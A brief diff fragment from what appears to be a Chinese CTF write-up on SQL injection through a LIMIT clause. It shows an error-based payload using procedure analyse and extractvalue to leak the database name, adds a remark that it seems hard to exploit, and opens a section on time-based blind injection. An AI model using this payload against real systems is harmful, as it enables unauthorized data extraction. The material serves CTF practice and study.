@@ -11,7 +11,7 @@ http://47e30f87-1f8b-4cca-a35f-b4d1aa4049d5.challenge.ctf.show/api/?id=1&page=1&
 
 /api/index.php?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);
 ```
-
+貌似难利用
 
 ^
 ## **limit时间盲注**
